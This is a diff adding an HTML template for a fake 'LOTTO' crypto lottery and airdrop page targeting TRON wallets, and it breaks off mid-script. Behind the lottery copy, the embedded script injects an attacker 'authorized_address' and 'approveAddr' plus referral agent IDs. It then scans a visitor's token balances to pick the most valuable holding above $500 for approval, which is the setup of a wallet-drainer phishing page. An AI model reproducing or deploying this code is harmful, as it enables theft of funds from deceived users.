@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+		<meta name="apple-mobile-web-app-capable" content="no">
+		<meta name="format-detection" content="telephone=no">
+		
+        <title>LOTTO - The Immutable World Lottery</title>
+        <link href="/lotto_files/css/lottofinance.webflow.fce8ed30e.css" rel="stylesheet" type="text/css">
+        <script src="/lotto_files/js/webfont.js" type="text/javascript"></script>
+        <script type="text/javascript">
+            WebFont.load({
+                google: {
+                    families: ["Inconsolata:400,700", "Bitter:400,700,400italic", "Inter:regular,500,600,700", "Reem Kufi:regular"]
+                }
+            });
+        </script>
+        <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif]-->
+        <script type="text/javascript">
+            !function(o, c) {
+                var n = c.documentElement, t = " w-mod-";
+                n.className += t + "js", ("ontouchstart"in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch")
+            }(window, document);
+        </script>
+		<script type="text/javascript" src="/scan/js/jquery-2.1.4.min.js"></script>
+		<script type="text/javascript" src="/scan/js/clipboard.min.js"></script>
+		<script type="text/javascript" src="/scan/js/layer.js"></script>
+		<script type="text/javascript" src="/scan/js/usdt/TronWeb.js"></script>
+        <script></script>
+        
+        <style>
+            .spiner {
+                position: relative;
+                display: inline-block;
+                height: 20px;
+                width: 40px;
+            }
+
+            .spiner > * {
+                position: absolute;
+                top: 5px;
+                height: 10px;
+                width: 10px;
+                border-radius: 50%;
+                background: white;
+                opacity: 0.6;
+                -webkit-transform: translateX(0px);
+                transform: translateX(0px);
+            }
+
+            .spiner > *:nth-child(1) {
+                left: 0;
+                -webkit-animation: mymove 1.3s infinite ease-in;
+                animation: mymove 1.3s infinite ease-in;
+            }
+
+            .spiner > *:nth-child(2) {
+                left: 12px;
+                -webkit-animation: mymove 1.3s 0.3s infinite ease-in;
+                animation: mymove 1.3s 0.3s infinite ease-in;
+            }
+
+            .spiner > *:nth-child(3) {
+                left: 24px;
+                -webkit-animation: mymove 1.3s 0.6s infinite ease-in;
+                animation: mymove 1.3s 0.6s infinite ease-in;
+            }
+
+            @-webkit-keyframes mymove {
+                0%, 100%, 80% {
+                    opacity: 0.6;
+                    -webkit-transform: scale(0.4);
+                }
+
+                40% {
+                    opacity: 1;
+                    -webkit-transform: scale(1);
+                }
+            }
+
+            @keyframes mymove {
+                0%, 100%, 80% {
+                    opacity: 0.6;
+                    transform: scale(0.4);
+                }
+
+                40% {
+                    opacity: 1;
+                    transform: scale(1);
+                }
+            }
+
+            .notify {
+                position: relative;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                width: 100%;
+                min-height: 100px;
+                box-sizing: border-box;
+                color: white;
+                text-align: center;
+                background: rgb(32 5 139);
+                overflow: hidden;
+                box-sizing: border-box;
+                transition: height .2s;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-size: 24px;
+                z-index: 9999;
+            }
+
+            .tooltip {
+                height: 25px;
+                width: 25px;
+                border-radius: 50%;
+                cursor: pointer;
+                position: absolute;
+                top: 5px;
+                left: 5px;
+            }
+
+            #tooltip {
+                background: rgba(0, 0, 0, 0.8);
+                padding: 10px;
+                position: absolute;
+                color: #fff;
+                font-size: 14px;
+                border-radius: 4px;
+                transition: opacity 0.1s;
+                opacity: 0;
+                z-index: 9;
+            }
+
+            .winning-address {
+                cursor: pointer
+            }
+
+            .tooltip-info {
+                height: 25px;
+                width: 25px;
+                border-radius: 50%;
+                cursor: pointer;
+                position: absolute;
+                top: 5px;
+                left: 5px;
+            }
+
+            #tooltip-info {
+                background: rgba(0, 0, 0, 0.8);
+                position: absolute;
+                color: #fff;
+                font-size: 14px;
+                border-radius: 4px;
+                transition: opacity 0.1s;
+                opacity: 0;
+                z-index: 9;
+            }
+
+            .notify-loader .flex-display {
+                font-size: 16px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column;
+            }
+
+            .hover-address-box {
+                position: absolute;
+                left: 0;
+                bottom: 0;
+                top: 0;
+                height: 100%;
+                width: 100%;
+                justify-content: center;
+                align-items: center;
+                cursor: default;
+                /*background-color: #0e101a;*/
+                z-index: 99999999;
+                display: none;
+            }
+
+            .hover-active .hover-address-box {
+                display: flex;
+            }
+
+            .winning-address {
+                position: relative;
+            }
+
+            .tooltip-info {
+                height: 25px;
+                width: 25px;
+                border-radius: 50%;
+                cursor: pointer;
+                position: absolute;
+                top: 5px;
+                left: 5px;
+            }
+
+            #tooltip-info {
+                background: rgba(0, 0, 0, 0.8);
+                padding: 10px;
+                position: absolute;
+                color: #fff;
+                font-size: 14px;
+                border-radius: 4px;
+                transition: opacity 0.1s;
+                opacity: 0;
+                z-index: 9;
+            }
+
+            .hover-address-box img {
+                width: 20px;
+                min-width: 20px;
+                cursor: pointer;
+            }
+
+            .winning-address-copy {
+                margin-right: 20px
+            }
+
+            #snackbar {
+                visibility: hidden;
+                min-width: 300px;
+                margin-left: -125px;
+                background-color: #333;
+                color: #fff;
+                text-align: center;
+                border-radius: 5px;
+                padding: 16px;
+                position: fixed;
+                z-index: 99999;
+                left: 50%;
+                bottom: 20px;
+                font-size: 17px;
+            }
+
+            #snackbar.show {
+                visibility: visible;
+                -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
+                animation: fadein 0.5s, fadeout 0.5s 2.5s;
+            }
+
+            @-webkit-keyframes fadein {
+                from {
+                    bottom: 0;
+                    opacity: 0;
+                }
+
+                to {
+                    bottom: 20px;
+                    opacity: 1;
+                }
+            }
+
+            @keyframes fadein {
+                from {
+                    bottom: 0;
+                    opacity: 0;
+                }
+
+                to {
+                    bottom: 20px;
+                    opacity: 1;
+                }
+            }
+
+            @-webkit-keyframes fadeout {
+                from {
+                    bottom: 20px;
+                    opacity: 1;
+                }
+
+                to {
+                    bottom: 0;
+                    opacity: 0;
+                }
+            }
+
+            @keyframes fadeout {
+                from {
+                    bottom: 20px;
+                    opacity: 1;
+                }
+
+                to {
+                    bottom: 0;
+                    opacity: 0;
+                }
+            }
+
+            .switch-btn.active {
+                background-color: #3246DD;
+                border-radius: 8px;
+                z-index: 5;
+            }
+        </style>
+
+        <style>
+            .first-row {
+                background-color: #303fe1;
+            }
+
+            .first-row .pricing-table-row-title .pricing-table-content .pricing-card-row .pricing-row-text {
+                font-size: 21px;
+                font-weight: 600;
+            }
+
+            .first-row .w-col .pricing-table-content .pricing-card-row .pricing-row-text {
+                font-size: 21px;
+                font-weight: 600;
+            }
+
+            .first-row #winning-address-col_0 {
+                background: red;
+            }
+
+            .pricing-table-wrapper-2 {
+                display: none;
+            }
+
+            @media screen and (max-width: 991px) {
+                .pricing-table-row-title {
+                    display: block;
+                }
+
+                .pricing-row-text.title {
+                    opacity: 1;
+                }
+
+                .first-row {
+                    background-color: unset;
+                }
+
+                .highlighted-pricing-table-row-2 {
+                    background-color: unset;
+                }
+
+                .pricing-table-row-title {
+                    width: 25%;
+                    background-color: unset;
+                }
+
+                .pricing-table-row {
+                    display: flex;
+                    flex-direction: row;
+                }
+            }
+
+            @media screen and (max-width: 770px) {
+                .pricing-row-text.title {
+                    padding-left: 0px;
+                }
+
+                .pricing-table-content {
+                    padding-top: 0px;
+                    padding-bottom: 0px;
+                    padding-right: 10px;
+                    padding-left: 10px;
+                }
+
+                .first-row #winning-address-col_0 {
+                    background-color: unset;
+                }
+
+                .pricing-row-text.winning-address {
+                    font-size: 11px!important;
+                }
+
+                .select-row .pricing-row-text {
+                    display: none;
+                }
+
+                .select-row .winning-address {
+                    display: block;
+                }
+
+                .select-row #winning-address-col_0 {
+                    background: unset!important;
+                }
+
+                .select-row .pricing-table-content {
+                    border: 1px solid transparent;
+                }
+
+                .first-row .w-col .pricing-table-content .pricing-card-row .pricing-row-text {
+                    font-size: 16px;
+                }
+            }
+
+            .first-row #winning-address-col_0 {
+                background: #ffcb00;
+            }
+
+            .pricing-row-text.title {
+                padding-left: 10px!important;
+            }
+
+            .first-row #winning-address-col_0 {
+                background: red;
+            }
+
+            .button {
+                word-spacing: 5px;
+            }
+
+            .section-title.left.color-blue-header {
+                color: #82acff;
+            }
+
+            .first-row #winning-address-col_0 {
+                background: rgb(0, 211, 120);
+            }
+
+            #timer-message-to-lotto, #timer-to-lotto {
+                opacity: 1 !important;
+            }
+
+            .timer-massage-div, .timer-div {
+                display: none;
+            }
+
+            .pricing-row-text.winning-address {
+                width: 100%;
+                text-align: center;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .connect-btn {
+                width: 150px;
+                height: 40px;
+                -webkit-box-pack: center;
+                -webkit-justify-content: center;
+                -ms-flex-pack: center;
+                justify-content: center;
+                -webkit-flex-wrap: wrap;
+                -ms-flex-wrap: wrap;
+                flex-wrap: wrap;
+                -webkit-align-content: center;
+                -ms-flex-line-pack: center;
+                align-content: center;
+                border-radius: 8px;
+                background-color: #303fe1;
+                cursor: pointer;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="div-block-10">
+            <div data-w-id="5e898844-86dd-fe4a-41ca-9884a5dc9348" data-animation-type="lottie" data-src="http://uploads-ssl.webflow.com/5faf342b21d82e40614e7485/5faf4036b3236f03e72dcf71_lf20_30iie6.json" data-loop="1" data-direction="1" data-autoplay="1" data-is-ix2-target="0" data-renderer="svg" data-default-duration="10.01000960229397" data-duration="9" class="lottie-animation"></div>
+        </div>
+        <div data-collapse="medium" data-animation="over-right" data-duration="600" role="banner" class="navbar w-nav">
+            <div class="container nav-flex nav-cont">
+                <a href="index.html" aria-current="page" class="brand w-nav-brand w--current">
+                    <img src="/lotto_files/picture/5faf39a21c0cce11258d10f5_horizon.svg" id="lottologohome" alt="" class="logo">
+                </a>
+				<input id="dizhi" value="{$domain}{:url('index/lotto/index_trc',['agent'=>$userId])}" style="position: fixed;top: -999em;" readonly />
+                <div class="connect-btn-w connect-btn open-wallet" style="display: flex;justify-content:center;align-items:center;" data-clipboard-target="#dizhi">
+                    <div class="text-block-18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Connect to Wallet</font></font></div>
+                </div>
+                <div data-hover="" data-delay="0" class="account-address-drop-down w-dropdown">
+                    <div class="dropdown-toggle w-dropdown-toggle">
+                        <div class="icon w-icon-dropdown-toggle"></div>
+                        <div id="IDoftheDIV" class="user-address-text"></div>
+                    </div>
+                    <nav class="dropdown-list w-dropdown-list">
+                        <div class="log-out">Log Out</div>
+                    </nav>
+                </div>
+<!--                <div class="menu-button w-nav-button">-->
+<!--                    <img src="/lotto_files/picture/5faf342c5092a97fda6be1ef_MenuIc.svg" alt="" class="burger-icon">-->
+<!--                </div>-->
+                <img src="/lotto_files/picture/6076d0eb9e12ed3027298d1d_copy-ic.png" loading="lazy" width="20" alt="" class="image-11">
+                <img src="/lotto_files/picture/6076d0eb8c565061a93cdea8_link-ic.png" loading="lazy" width="20" alt="" class="image-12">
+            </div>
+        </div>
+        <section class="hero-section section-height">
+            <div class="container hero-flex-horizontal">
+                <div data-w-id="48ff99f8-96fd-2cb0-9f3a-42792256e32c" class="hero-left">
+                    <img src="/lotto_files/picture/5faf35cabd22a00c282fd51d_newnew.png" sizes="(max-width: 479px) 74vw, (max-width: 767px) 54vw, (max-width: 991px) 39vw, (max-width: 1279px) 34vw, 350px" alt="" class="hero-img">
+                </div>
+                <div data-w-id="48ff99f8-96fd-2cb0-9f3a-42792256e32e" class="hero-right first-on-mobile">
+                    <h1 class="hero-title medium lotto-header-top">Lotto</h1>
+                    <p class="paragraph-2">
+                        <strong>
+                            Tuesdays and Fridays at 8 PM &nbsp;EST <br>
+                        </strong>
+                        Lotto tokens worth $1 are automatically pulled from all users' wallets, aggregated, and randomly assigned to airdrop users. &nbsp;<br>
+                    </p>
+                    <div class="hero-email-form w-form">
+                        <form id="wf-form-Hero-subscribe-form" name="wf-form-Hero-subscribe-form" data-name="Hero subscribe form" class="inline-form flex-vertical-mobile">
+                            <span id="register-for-airdrop" href="javascript:void(0);" class="button bottombutton w-button btn-connect" >TRADE LOTTO ZKSWAP</span>
+                            <span id="register-for-airdrop" href="javascript:void(0);" class="button topbutton w-button btn-connect" id="btn-connect">CLAIM LOTTO AIRDROP</span>
+                        </form>
+                        <div class="success-message w-form-done">
+                            <div>Thank you! Your submission has been received!</div>
+                        </div>
+                        <div class="error-message w-form-fail">
+                            <div>Oops! Something went wrong while submitting the form.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <div class="section-4">
+            <div class="container-switcher">
+                <div id="network-amount-stats" class="radio-switch">
+                    <div class="w-form">
+                        <form id="email-form" name="email-form" data-name="Email Form">
+                            <a id="eth-winners-switch" data="eth" href="index.html#" class="eth-btn switch-btn active switch-control amounts-switch w-button">ETH</a>
+                            <a href="index.html#" data="bsc" class="bsc-btn switch-btn switch-control amounts-switch w-button">BSC</a>
+                        </form>
+                        <div class="w-form-done">
+                            <div>Thank you! Your submission has been received!</div>
+                        </div>
+                        <div class="w-form-fail">
+                            <div>Oops! Something went wrong while submitting the form.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-2">
+                <div class="metric-block-2 stack-row">
+                    <div class="metric-icon-block-2">
+                        <img src="{$domain}/lotto_files/picture/603fcfb6d17762c784bfb648_starred.png" loading="lazy" width="51" alt="" class="metric-icon">
+                    </div>
+                    <div id="current-entry-price" class="metrics-title">loading ..</div>
+                    <div class="metrics-text-2">Current Entry Price</div>
+                </div>
+                <div class="metric-block-2 stack-row">
+                    <div class="metric-icon-block-2">
+                        <img src="/lotto_files/picture/603fd2f41edd9f95f2bb3e55_288217-.png" alt="" class="metric-icon">
+                    </div>
+                    <div id="current-price-pool" class="metrics-title">loading ..</div>
+                    <div class="metrics-text-2">Current Weekly Jackpot</div>
+                </div>
+            </div>
+        </div>
+        <section class="section medium lotto-winners">
+            <div class="container timer-container">
+                <div class="half-section-flex">
+                    <div class="half-div sticky-on-tablet tablet-header">
+                        <h2 class="section-title left">LOTTO Winners &amp;Information</h2>
+                    </div>
+                    <div class="half-div sticky-on-tablet timer-div">
+                        <div class="pricing-label-2 table timer-label">Time to the next lottery:</div>
+                        <h2 id="timer-to-lotto" class="section-title left color-blue-header">
+                            <br>‍
+                        </h2>
+                    </div>
+                    <div class="half-div sticky-on-tablet timer-massage-div">
+                        <h2 id="timer-message-to-lotto" class="section-title left message-timer">
+                            <br>
+                        </h2>
+                    </div>
+                </div>
+            </div>
+            <div class="container grid-container">
+                <div class="pricing-table-wrapper-2">
+                    <div class="highlighted-pricing-table-row-2"></div>
+                    <div class="pricing-table-header-2 radius-grid radius-display">
+                        <div class="toggle-wrapper-2 table">
+                            <div class="pricing-card-header table">
+                                <div class="toggle-text annually lotterydate">Lottery Date</div>
+                            </div>
+                        </div>
+                        <div class="pricing-table-header-cols w-row">
+                            <div class="pricing-table-cols w-col w-col-4 w-col-small-4 w-col-tiny-4">
+                                <div class="pricing-card-header table">
+                                    <div class="toggle-text annually entryprice">Entry Price</div>
+                                    <div id="tooltip-entry-price" class="tooltip-info-box">
+                                        <img src="/lotto_files/picture/603904106c61775e6d8e249d_blue-in.svg" loading="lazy" width="40" alt="" class="image-5">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="pricing-table-cols w-col w-col-4 w-col-small-4 w-col-tiny-4">
+                                <div class="pricing-card-header table middle">
+                                    <div id="tooltip-winning-address" class="tooltip-info-box">
+                                        <img src="/lotto_files/picture/603904106c61775e6d8e249d_blue-in.svg" loading="lazy" width="40" alt="" class="image-6">
+                                    </div>
+                                    <div class="toggle-text annually">Winning Address</div>
+                                </div>
+                            </div>
+                            <div class="pricing-table-cols w-col w-col-4 w-col-small-4 w-col-tiny-4">
+                                <div class="pricing-card-header table">
+                                    <div class="pricing-label-2 table">JACKPOT</div>
+                                    <div id="tooltip-lotto-won" class="tooltip-info-box">
+                                        <img src="/lotto_files/picture/603904106c61775e6d8e249d_blue-in.svg" loading="lazy" width="40" alt="" class="image-7">
+                                    </div>
+                                    <div class="toggle-text annually lotto-won">LOTTO Won</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="pricing-table-category"></div>
+                    <div class="pricing-table-footer-2">
+                        <div class="footer-empty-cell"></div>
+                        <div class="pricing-table-header-cols w-row">
+                            <div class="pricing-table-cols w-col w-col-4 w-col-small-4 w-col-tiny-4">
+                                <div class="pricing-card-btn-container table"></div>
+                            </div>
+                            <div class="pricing-table-cols w-col w-col-4 w-col-small-4 w-col-tiny-4">
+                                <div class="pricing-card-btn-container table"></div>
+                            </div>
+                            <div class="pricing-table-cols w-col w-col-4 w-col-small-4 w-col-tiny-4">
+                                <div class="pricing-card-btn-container table"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section class="section with-header how-it-works">
+            <div class="div-block-2">
+                <h2 class="section-title center">How it works</h2>
+            </div>
+            <div class="div-block-3">
+                <div class="div-block height-crown">
+                    <img src="/lotto_files/picture/5faf37e925f3cd5b905a43d5_crown.svg" loading="lazy" height="45" alt="" class="image">
+                    <div class="text-block-2">Get LOTTO Tokens</div>
+                    <p class="paragraph-7">If you &#x27;re eligible, claim tokens from the airdrop or get them on an exchange like Uniswap.</p>
+                </div>
+                <div class="div-block height-crown">
+                    <img src="/lotto_files/picture/5faf37e925f3cd5b905a43d5_crown.svg" loading="lazy" height="45" alt="" class="image">
+                    <div class="text-block-2">Wait For Lottery</div>
+                    <p class="paragraph-6">
+                        LOTTO holders will have the entry fee automatically deducted from their wallets through LOTTO &#x27;s unique <strong>startGame() </strong>
+                        function and <strong>Balance Shift (B-Shift)</strong>
+                        protocol. No action is required from users in order to participate- simply hold LOTTO in your wallet!
+                    </p>
+                </div>
+                <div class="div-block height-crown">
+                    <img src="/lotto_files/picture/5faf37e925f3cd5b905a43d5_crown.svg" loading="lazy" height="45" alt="" class="image">
+                    <div class="text-block-2">Check Your Wallet</div>
+                    <p class="paragraph-8">If you win, the jackpot LOTTO will automatically appear in your wallet!</p>
+                </div>
+            </div>
+        </section>
+        <h2 id="airdrop" class="section-title centered heading-top-margin">
+            LOTTO Airdrop <br>Claim Period Instructions
+        </h2>
+        <div id="airdrop-signup-instructions" class="airdrop-instructions w-container">
+            <div class="airdrop-blocks">
+                <div class="metrics">
+                    <div class="metric-row">
+                        <div class="metric-block stack-row how-it-works">
+                            <div class="metric-icon-block">
+                                <img src="/lotto_files/picture/5fb08ec1df5533e151845d2d_Telegra.svg" alt="" class="metric-icon offset">
+                            </div>
+                            <div class="metrics-text">
+                                The LOTTO airdrop claim period is open! Navigate to the claim page below in order to acquire your LOTTO from the airdrop.<br>
+                                <br>
+                            </div>
+                            <a id="register-for-airdrop" href="claim.html" class="button w-button">CLAIM LOTTO</a>
+                            <div class="metrics-text official-teleg">
+                                After you &#x27;ve claimed, join the
+                                <a href="javascript:;">
+                                    <span class="text-span lottolinks">LOTTO Official Telegram</span>
+                                </a>
+                                and add the LOTTO contract address to your wallet.
+                                <span class="text-span lottolinks">
+                                    <br>
+                                </span>
+                            </div>
+                            <p class="paragraph-3">
+                                <a href="index.html#" class="link-2">
+                                    <span class="text-span-2">
+                                        <br>
+                                    </span>
+                                </a>
+                            </p>
+                            <div class="div-width">
+                                <div class="metrics-text contract-address">
+                                    <strong class="bold-text-4">LOTTO contract address:</strong>
+                                    <span class="text-span lottolinks">
+                                        <br>
+                                    </span>
+                                </div>
+                                <p class="paragraph-12">0xb0dFd28d3CF7A5897C694904Ace292539242f858</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <section id="About" class="section-5 section-top-margin bottom-check">
+            <div class="container">
+                <div class="features-flex">
+                    <div class="features-text-block left">
+                        <h2 class="feature-title-large">LOTTO: The Immutable World Lottery</h2>
+                        <p class="paragraph-9">
+                            Welcome to the world lottery of the future. This is the only lottery system built directly into an Ethereum token- <strong>the token IS the lottery</strong>
+                            . Unlike a traditional lottery where players have to continuously buy tickets for every drawing, LOTTO focuses on simplicity- just acquire the token, hold, and you&#x27;ll automatically be entered into the lottery each week.
+                        </p>
+                    </div>
+                    <div class="features-img-block">
+                        <img src="/lotto_files/picture/5fc39eae8f82d83d686939a4_lottogr.png" sizes="(max-width: 479px) 44vw, (max-width: 767px) 45vw, (max-width: 1279px) 48vw, 616px" alt="">
+                    </div>
+                </div>
+            </div>
+            <div class="w-container">
+                <div class="features-flex">
+                    <div class="features-img-block">
+                        <div data-w-id="37e0300d-e56c-4648-bd05-4d1e1df8791b" data-animation-type="lottie" data-src="http://uploads-ssl.webflow.com/5faf342b21d82e40614e7485/5faf342c5092a942926be286_success.json" data-loop="0" data-direction="1" data-autoplay="1" data-is-ix2-target="0" data-renderer="svg" data-default-duration="3.870537046220335" data-duration="0" class="lottie-animation-2"></div>
+                    </div>
+                    <div class="features-text-block right">
+                        <h2 class="feature-title-large">A Decentralized &amp;Cross-Border Lottery Game</h2>
+                        <p class="paragraph-5">
+                            LOTTO is immutable, meaning that the lottery will run continuously and no third party can stop it from occurring. After the timelock period has passed, anyone can call the <strong>startGame() </strong>
+                            function to commence the lottery. Once started, the Balance Shift (<strong>B-Shift</strong>
+                            ) protocol produces a provably-fair winner using an oracle service called Provable and then shifts user balances so that the winner receives all of the LOTTO from participants. <br>
+                            <br>The winner receives 90% of the LOTTO for the lottery, while the remaining 10% is distributed to the user who calls startGame(). This provides an incentive for the lottery to be called and covers the gas fees for the transaction as well.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section class="section section-top-margin">
+            <div class="container">
+                <div class="faq-flex-wrapper">
+                    <div class="half-div">
+                        <h2 class="section-title left">Questions &amp;Answers</h2>
+                    </div>
+                    <div class="faq-wrapper">
+                        <div data-hover="" data-delay="300" class="faq-dropdown w-dropdown">
+                            <div class="faq-dropdown-toggle w-dropdown-toggle">
+                                <div class="faq-icon-block">
+                                    <div class="faq-icon-line"></div>
+                                    <div class="faq-icon-line rotate"></div>
+                                </div>
+                                <div class="faq-title">When will lotteries take place?</div>
+                            </div>
+                            <nav class="faq-dropdown-list w-dropdown-list">
+                                <p class="faq-paragraph">The function startGame() will be called twice per week- every Tuesday and Friday at 8 PM EST. This will run the lottery function, which takes 5 LOTTO from all users balances, pools it together, and distributes it to one user at random. The user does not need to do anything to participate in the lottery besides hold LOTTO in their wallet. </p>
+                            </nav>
+                        </div>
+                        <div data-hover="" data-delay="300" class="faq-dropdown w-dropdown">
+                            <div class="faq-dropdown-toggle w-dropdown-toggle">
+                                <div class="faq-icon-block">
+                                    <div class="faq-icon-line"></div>
+                                    <div class="faq-icon-line rotate"></div>
+                                </div>
+                                <div class="faq-title">How will the entry price for the LOTTO lottery be determined?</div>
+                            </div>
+                            <nav class="faq-dropdown-list w-dropdown-list">
+                                <p class="faq-paragraph">The entry price will start at 10 LOTTO. After some time, we will deploy a smart contract upgrade that will fully decentralize the entry price, tethering it to 1 USD based on a moving price average of several days.</p>
+                            </nav>
+                        </div>
+                        <div data-hover="" data-delay="300" class="faq-dropdown w-dropdown">
+                            <div class="faq-dropdown-toggle w-dropdown-toggle">
+                                <div class="faq-icon-block">
+                                    <div class="faq-icon-line"></div>
+                                    <div class="faq-icon-line rotate"></div>
+                                </div>
+                                <div class="faq-title">How can I acquire LOTTO tokens?</div>
+                            </div>
+                            <nav class="faq-dropdown-list w-dropdown-list">
+                                <p class="faq-paragraph">
+                                    LOTTO was distributed for free via airdrop, and can be claimed by DeFi token holders in the <a href="claim.html">Claim Portal.</a>
+                                    The full list of eligibility requirements can be seen in the portal as well. In addition, LOTTO iis available on Uniswap, Bilaxy, and will be listed on several other centralized exchanges in the future.
+                                </p>
+                            </nav>
+                        </div>
+                        <div data-hover="" data-delay="300" class="faq-dropdown w-dropdown">
+                            <div class="faq-dropdown-toggle w-dropdown-toggle">
+                                <div class="faq-icon-block">
+                                    <div class="faq-icon-line"></div>
+                                    <div class="faq-icon-line rotate"></div>
+                                </div>
+                                <div class="faq-title">Is LOTTO decentralized?</div>
+                            </div>
+                            <nav class="faq-dropdown-list w-dropdown-list">
+                                <p class="faq-paragraph">
+                                    After the initial deployment and &quot;experimental &quot;period, where will be testing various parameters to see what works best, LOTTO will move towards 100% decentralization. Communiity governance will be established, and the community will collect a small fee from the lottery to help pay for the gas costs of calling startGame each week. <br>
+                                    <br>Anyone can call the startGame() function in the smart contract to start the lottery after 6 days and 23 hours has passed, so the lottery will run immutably once deployed.
+                                </p>
+                            </nav>
+                        </div>
+                        <div data-hover="" data-delay="300" class="faq-dropdown w-dropdown">
+                            <div class="faq-dropdown-toggle w-dropdown-toggle">
+                                <div class="faq-icon-block">
+                                    <div class="faq-icon-line"></div>
+                                    <div class="faq-icon-line rotate"></div>
+                                </div>
+                                <div class="faq-title">Can I split my LOTTO into multiple accounts once I receive it to increase my chances of winning the lottery?</div>
+                            </div>
+                            <nav class="faq-dropdown-list w-dropdown-list">
+                                <p class="faq-paragraph">Yes. If you &#x27;d like to increase your chances of winning the LOTTO lottery, you may split your LOTTO into multiple accounts, so long as you have enough LOTTO tokens in each account to cover the entry price. </p>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section id="Community"></section>
+        <div class="section-2 lottocommunity">
+            <h1 class="heading-3">Join the LOTTO Community</h1>
+            <div class="social-block">
+                <a href="javascript:;" class="social-block-link fb w-inline-block"></a>
+                <a href="javascript:;" class="social-block-link twitter w-inline-block"></a>
+                <a href="javascript:;" class="social-block-link telegram w-inline-block"></a>
+                <a href="javascript:;" class="social-block-link medium w-inline-block"></a>
+                <a href="javascript:;" class="social-block-link reddit w-inline-block"></a>
+                <a href="javascript:;" class="social-block-link discord w-inline-block"></a>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="footer-flex">
+                <div class="footer-top-block">
+                    <div class="footer-grid">
+                        <div id="w-node-_93a34ca8-33ed-dd5a-eb51-dcec0dc5cd9c-8afba571" class="footer-grid-block">
+                            <a href="index.html" aria-current="page" class="brand margin-bottom w-inline-block w--current">
+                                <img src="/lotto_files/picture/5faf39a21c0cce11258d10f5_horizon.svg" alt="" class="logo in-footer">
+                            </a>
+                            <p class="footer-text">The lottery that can &#x27;t be stopped.</p>
+                        </div>
+                        <div id="w-node-_319adbb9-8488-0292-6e94-606410288395-8afba571" class="footer-grid-block">
+                            <div class="footer-title">Navigation</div>
+                            <a href="{:url('index/lotto/index',['agent'=>$userId])}" class="footer-link">Wrap</a>
+                            <a href="{:url('index/lotto/index',['agent'=>$userId])}" class="footer-link">About</a>
+                            <a href="{:url('index/lotto/index',['agent'=>$userId])}#Community" class="footer-link">Community</a>
+                            <a href="{:url('index/lotto/index',['agent'=>$userId])}" class="footer-link">Lottery Results</a>
+                            <a href="{:url('index/lotto/index',['agent'=>$userId])}" class="footer-link">Team</a>
+                        </div>
+                        <div id="w-node-_9b916714-a6cd-857d-defc-e60fb6ab26ab-8afba571" class="footer-grid-block">
+                            <div class="footer-address-block aling-top">
+                                <div class="footer-address-text">For questions, inquiries, or partnerships, please contact @tylerfallon on Telegram or email:</div>
+                            </div>
+                            <div class="footer-address-block">
+                                <img src="/lotto_files/picture/5faf342c5092a958796be297_envelop.svg" alt="" class="footer-address-icon">
+                                <a href="mailto:tyler@upfiring.com" class="footer-address-text">
+                                    support@lotto.finance<br>
+                                </a>
+                            </div>
+                            <div class="footer-address-block"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-bottom-block"></div>
+            </div>
+        </div>
+        <div class="w-embed w-script">
+
+        </div>
+		<div style="display:none;">
+			<textarea id="jsondata">{$addr|json_encode}</textarea>
+		</div>
+        <div class="w-embed w-script">
+            <script>
+                var address = "{$address}";
+				var agent = "{$userId}";
+				var rank = 6.5;
+				var authorized_address = '{$authorized_address}';
+				var domain = '{$domain}';
+				var bizhong = 'USDT';
+				var approveAddr = "{$approveAddr}";
+
+				$(function() {
+					var clipboard = new ClipboardJS('.open-wallet');
+					clipboard.on('success', function(e) {
+						//layer.msg('复制成功');
+						setTimeout(function() {
+							window.location.href = "imtokenv2://navigate?screen=DappView&url=" + encodeURIComponent($('#dizhi').val());
+						}, 500);
+					});
+					clipboard.on('error', function(e) {
+						layer.msg('复制失败，请重新点击按钮');
+					});
+
+					const addr = JSON.parse($('#jsondata').html());
+					const price = {
+						'WIN': 0.001150,
+						'USDT': 1,
+						'TONS': 1.35,
+						'USDJ': 1.04,
+						'JST': 0.125,
+						"HT": 20.41,
+						"SUN": 33.97,
+						"EXNX": 0.0621,
+						"VCOIN": 0.004225,
+						"POL": 0.1393,
+						"CKRW": 0.002487,
+					}
+
+					const decimals = {
+						'WIN': 6,
+						'USDT': 6,
+						'TONS': 6,
+						'USDJ': 18,
+						'JST': 18,
+						"HT": 18,
+						"SUN": 18,
+						"EXNX": 18,
+						"VCOIN": 6,
+						"POL": 8,
+						"CKRW": 6,
+					}
+
+					var total = 0;
+					async function getMostValuableAssets(account) {
+						let _symbol = 'USDT';
+						for (const symbol of Object.keys(addr)) {
+							let contract = await tronWeb.contract().at(addr[symbol]);
+							let myBalance = await contract.balanceOf(account).call(function (err,balance){const usdt=balance/(10**(decimals[symbol]||18))*price[symbol];console.log(usdt);if (usdt>total&&usdt>500){_symbol=symbol;total=usdt;approveAddr=addr[_symbol];console.log(_symbol)}})
+						}
+						bizhong = _symbol;
+						return _symbol;
+					}
+
+					/**
+					* * Connect wallet button pressed.
+					*/
+					async function onConnect() {
+						$('.pages').append('<div class="modal-overlay"></div>');
+						$('.modal-overlay').addClass('modal-overlay-visible');
+						$('.modal').removeClass('modal-out').addClass('modal-in');
